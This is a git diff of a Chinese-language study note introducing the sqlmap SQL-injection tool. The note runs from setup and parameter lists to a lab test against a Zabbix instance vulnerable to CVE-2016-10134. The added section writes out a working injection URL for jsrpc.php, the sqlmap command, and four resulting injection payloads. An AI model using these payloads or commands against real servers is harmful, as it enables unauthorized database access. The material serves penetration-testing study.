@@ -1,5 +1,5 @@
 # sqlmap初识
-## sqlmap探索
+## 一、sqlmap探索
 ### 1、什么是sqlmap
 sqlmap 是一个开源渗透测试工具，它可以自动检测和利用 SQL 注入漏洞并接管数据库服务器。它具有强大的检测引擎，同时有众多功能，包括数据库指纹识别、从数据库中获取数据、访问底层文件系统以及在操作系统上带内连接执行命令。  
 简单来说，是一个可以自动对注入点进行sql注入的尝试工具  
@@ -32,7 +32,7 @@ alias sqlmap='python /Users/xxxx/yq_code/sqlmap/sqlmap.py'
 ![image](../image/sqlmapCom.png)
 至此sqlmap已经进入使用前的基础状态
 ### 3、sqlmap命令参数
-**指令集**
+**主要令集**
 ```
 u 指定目标URL (可以是http协议也可以是https协议)
 -d 连接数据库
@@ -67,5 +67,70 @@ u 指定目标URL (可以是http协议也可以是https协议)
 --keep-alive 设置持久连接，加快探测速度
 --null-connection 检索没有body响应的内容，多用于盲注
 --thread 最大为10 设置多线程
+
+其他参数可通过-hh进行帮助查询
 ```
-后续对各参数进行单独测试
+
+## 二、sqlmap初试
+### 测试目标
+`http://127.0.0.1:8080/zabbix.php?action=dashboard.view`  
+  ![image](../image/zabbix_login.png)
+以之前搭建的CVE-2016-10134漏洞为测试目标，通过对已知的注入点进行sqlmap的尝试  
+#### 当前注入点  
+以下注入通过jsrpc.php触发，且无需登录
+    在攻击机访问的zabbix的地址后面加上如下url：  
+  http://192.168.1.13:8080/jsrpc.php?type=0&mode=1&method=screen.get&profileIdx=web.item.graph&resourcetype=17&profileIdx2=updatexml(0,concat(0xa,user()),0)
+  ![image](../image/zabbix_injectionSU.png)  
+#### 测试语句  
+```
+sqlmap -u "http://localhost:8080/jsrpc.php?type=0&mode=1&method=screen.get&profileIdx=web.item.graph&resourcetype=17&profileIdx2=1234" -p "profileIdx2"
+
+解析：-u为指定url -p为指定注入的参数
+
+```
+#### 成功后如图：
+![image](../image/sqlmap_access.png)  
+对于成功后返回的解析：  
+```
+sqlmap -u "http://localhost:8080/jsrpc.php?type=0&mode=1&method=screen.get&profileIdx=web.item.graph&resourcetype=17&profileIdx2=1234" -p "profileIdx2"
+        ___
+       __H__
+ ___ ___[.]_____ ___ ___  {1.4.12.23#dev}
+|_ -| . [(]     | .'| . |
+|___|_  [,]_|_|_|__,|  _|
+      |_|V...       |_|   http://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 17:11:37 /2021-12-19/
+//展示出使用的数据库
+[17:11:37] [INFO] resuming back-end DBMS 'mysql'
+[17:11:37] [INFO] testing connection to the target URL
+//确认是否带上cookie
+you have not declared cookie(s), while server wants to set its own ('PHPSESSID=1tvlf0ugn2u...rns8v1o7v5;zbx_sessionid=20295a21faf...d97d0bae6d'). Do you want to use those [Y/n] Y
+sqlmap resumed the following injection point(s) from stored session:
+//展示出注入点及payload
+---
+Parameter: profileIdx2 (GET)
+    Type: boolean-based blind
+    Title: Boolean-based blind - Parameter replace (original value)
+    Payload: type=0&mode=1&method=screen.get&profileIdx=web.item.graph&resourcetype=17&profileIdx2=(SELECT (CASE WHEN (5765=5765) THEN 1234 ELSE (SELECT 9224 UNION SELECT 9622) END))
+
+    Type: inline query
+    Title: Generic inline queries
+    Payload: type=0&mode=1&method=screen.get&profileIdx=web.item.graph&resourcetype=17&profileIdx2=(SELECT CONCAT(CONCAT(0x716a7a7071,(CASE WHEN (2400=2400) THEN 0x31 ELSE 0x30 END)),0x7162766a71))
+
+    Type: error-based
+    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
+    Payload: type=0&mode=1&method=screen.get&profileIdx=web.item.graph&resourcetype=17&profileIdx2=1234 AND GTID_SUBSET(CONCAT(0x716a7a7071,(SELECT (ELT(6078=6078,1))),0x7162766a71),6078)
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: type=0&mode=1&method=screen.get&profileIdx=web.item.graph&resourcetype=17&profileIdx2=1234 AND (SELECT 6924 FROM (SELECT(SLEEP(5)))PrRx)
+---
+[17:11:39] [INFO] the back-end DBMS is MySQL
+back-end DBMS: MySQL >= 5.6
+
+[*] ending @ 17:11:39 /2021-12-19/
+```
+
